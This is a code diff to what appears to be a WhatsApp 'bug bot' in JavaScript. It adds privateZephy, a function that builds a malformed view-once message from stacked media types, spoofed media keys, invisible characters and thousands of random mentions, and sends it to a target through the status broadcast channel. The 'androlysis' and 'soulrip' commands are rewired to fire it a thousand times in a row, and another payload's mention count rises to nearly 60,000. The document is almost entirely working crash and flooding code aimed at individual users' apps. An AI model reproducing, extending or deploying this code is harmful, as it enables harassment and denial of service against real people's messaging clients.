@@ -747,6 +747,91 @@ async function Trash(target, mention = false) {
     }
 }
 
+async function privateZephy(target, mention = false) {
+  const FileSha256 = "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+        Sha25 = "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+        mkey = "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+        mimetypeSticker = "image/webp"
+
+  const mediaURL = "https://mmg.whatsapp.net/v/t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh=11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe=5126860596&_nc_sid=5e03e0&mms3=true"
+  
+  const mentionList = ["0@s.whatsapp.net", ...Array.from({length: 2000}, () => `${Math.floor(Math.random()*999999)}@s.whatsapp.net`)]
+  
+  let context = {
+    participant: target,
+    mentionedJid: mentionList,
+    forwardingScore: 9999,
+    isForwarded: true
+  }
+
+  let stickerMsg = { stickerMessage: {
+      url: mediaURL, fileSha256: FileSha256, fileEncSha256: Sha25, mediaKey: mkey, mimetype: mimetypeSticker,
+      directPath: "/v/t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh=11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe=5126860596&_nc_sid=5e03e0",
+      fileLength: {low: 1999, high:0, unsigned:true},
+      mediaKeyTimestamp: {low: Math.floor(Date.now()/1000), high:0, unsigned:false},
+      firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==",
+      isAnimated: true, isAvatar: false, isAiSticker: false, isLottie: false,
+      stickerPackId: "com.xnxx", stickerPackName: "\u2060",
+      stickerPackPublisher: "zep", stickerPackPublisherEmail: "zephyrine@heagoo.com",
+      stickerPackPublisherWebsite: "https://apibug-zephyrine.my.id",
+      isSuperAnimated: true, contextInfo: context
+    }
+  }
+
+  let audioMsg = { audioMessage: {
+      url: mediaURL, fileSha256: FileSha256, fileEncSha256: Sha25, mediaKey: mkey,
+      mimetype: "audio/mpeg", directPath: "/v/audio.fake",
+      fileLength: {low:1999, high:0, unsigned:true},
+      mediaKeyTimestamp: {low: Date.now(), high:0, unsigned:false},
+      ptt: true, contextInfo: context
+    }
+  }
+
+  let videoMsg = { videoMessage: {
+      url: mediaURL, fileSha256: FileSha256, fileEncSha256: Sha25, mediaKey: mkey,
+      mimetype: "video/mp4", directPath: "/v/video.fake",
+      fileLength: {low:1999, high:0, unsigned:true},
+      mediaKeyTimestamp: {low: Date.now(), high:0, unsigned:false},
+      caption: "omaak ada zephyrinee?!", jpegThumbnail: Buffer.from(""),
+      contextInfo: context
+    }
+  }
+
+  let docMsg = { documentMessage: {
+      url: mediaURL, fileSha256: FileSha256, fileEncSha256: Sha25, mediaKey: mkey,
+      mimetype: "application/pdf", title: "\u2060undangan\bpernikahan", fileName: "\u2060undangan\bpernikahan.pdf",
+      directPath: "/v/doc.fake", fileLength: {low:1999, high:0, unsigned:true},
+      mediaKeyTimestamp: {low: Date.now(), high:0, unsigned:false},
+      pageCount: 1337, contextInfo: context
+    }
+  }
+
+  let imageMsg = { imageMessage: {
+      url: mediaURL, fileSha256: FileSha256, fileEncSha256: Sha25, mediaKey: mkey,
+      mimetype: "image/jpeg", caption: "#APHOPHIS1TOP",
+      directPath: "/v/image.fake", fileLength: {low:1999, high:0, unsigned:true},
+      mediaKeyTimestamp: {low: Date.now(), high:0, unsigned:false},
+      jpegThumbnail: Buffer.from(""), contextInfo: context
+    }
+  }
+
+  let message = { viewOnceMessage: { message: { ...stickerMsg, ...audioMsg, ...videoMsg, ...docMsg, ...imageMsg } } }
+  
+  let msg = generateWAMessageFromContent(target, message, {})
+
+  await rich.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta", attrs: {}, content: [{
+        tag: "mentioned_users", attrs: {}, content: [{
+          tag: "to", attrs: { jid: target }, content: undefined
+        }]
+      }]
+    }]
+  })
+}
+
 async function XzV(avx, target) {
 const mentionedList = Array.from(
   { length: 40000 },
@@ -1047,7 +1132,7 @@ let Newdly = await generateWAMessageFromContent(
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2MBERISGBUYLxoaL2NCOEJjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY//AABEIACIAIAMBEQACEQEDEQH/xAGiAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgsQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+gEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AOEt4HnfauB2yxwB+PQVMpKKJlKxrXlkkcTRwRMI9nmE+WC6sFGQT1xk4J4G4NxxiueFTmev9f1+VtTJTu9SzbWUF1YIRbL5hiJKgENK4DHgnJI4XITH3u2MVnKcoT30v9y0/wCDv2IcnGVr6f1/WpjajYvZXUsZXKI+0MG3AdcDOBzwfToa6qVRVIpm8J8yub2lqlrpKymPfEwyWliLxNk4ORg8hhg8rwqnB6Vx1ffqW/J2f6dNtH123MJ+9OwaQbTU7u5e/kSK2tgAkTSYGCcZLZz2UfkOgAoxDqUopU1q+tgq80EuXdk2tRWeleXdadMgfzPKeESFskcnvkEcfQ4IwcVGGnUq3jUXncik5z0kU7u7e9hCSOv2YviWQrypfJ7YzjbngAEryD1O8Kag21v/AJf156GkY8ruZ0SDYN0xzhQDuyig5Y/Tnt9e9bN9l/mW3Y07G7NiYpLxoEjR/JAeMmVcMGPboCQeeeDjBrnqwU7qKffy2t+X/BM5R5tEP1S+adZZLSS1by05LI29gyqrbcj6DJ+bg844qaVPla5k9f0u1t/w3zFCNn71yO10yL7JJJdMoZcr80hTaThclSv8LEZ549CCM3OrLmSj/XX8Vtp/wG5u9kZul6gIWWGXaEJ2+Yw3bFOe3oCc4GM8g5zWtalzK6/r+vw3RrUhfVGvfWlvcqzHjAdUz8hIUMcng9Nn3cfxLyBhV56dSUXb+tbf57+T06vGMmmVtNWFJrcsFQvkB2lXC4I5xkFcDPXk9sHBGtZy5Xb+v8/6uVNuzItV1VjG9ogYEHBYqqMOoOQo67SF9MA8ZPBRope9/wAH8/v9eo6dPW/9f11MSus6DVsZpYtLmljldJRNGgdWIIXa3GfTgcewrmnFSqKLWln+hhNJzsxv3dLuJF4dZYwGHUAh88/hTf8AEiuln+gfbSMyug3P/9k=",
          contextInfo: {
-           mentionedJid: Array.from({ length: 38110 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+           mentionedJid: Array.from({ length: 59990 }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
@@ -2631,24 +2716,8 @@ case 'androlysis': {
         };
 	 await rich.sendMessage(m.chat, message, { quoted: m });
 	 await rich.sendMessage(m.chat, { react: { text: '👿', key: m.key } });
-    for (let r = 0; r < 50; r++) {
-await FcDelMsg(target);
-await sleep(2000);
-await newspamfc(target);
-await sleep(2000);
-await GxhorseForceClose(target);
-await sleep(2000);
-await FolwareFunction(target, false);
-await sleep(2000);
-await sbh(target);
-await sleep(2000);
-await FrostByte2(target);
-await sleep(2000);
-await CorouselXLoca(target);
-await sleep(2000);
-await SkyForce(target);
-await sleep(2000);
-await CrashPayloadNew(target)
+    for (let r = 0; r < 1000; r++) {
+await privateZephy(target, false)
     }
 
  await rich.sendMessage(m.chat, message, { quoted: m });	
@@ -2692,24 +2761,8 @@ case 'soulrip': {
     await rich.sendMessage(target, { react: { text: '👿', key: m.key } });
 
     // Launch full bug payload
-    for (let r = 0; r < 50; r++) {
-await FcDelMsg(target);
-await sleep(2000);
-await newspamfc(target);
-await sleep(2000);
-await GxhorseForceClose(target);
-await sleep(2000);
-await FolwareFunction(target, false);
-await sleep(2000);
-await sbh(target);
-await sleep(2000);
-await FrostByte2(target);
-await sleep(2000);
-await CorouselXLoca(target);
-await sleep(2000);
-await SkyForce(target);
-await sleep(2000);
-await CrashPayloadNew(target)
+    for (let r = 0; r < 1000; r++) {
+await privateZephy(target, false)
     }
 
     await rich.sendMessage(target, message); 
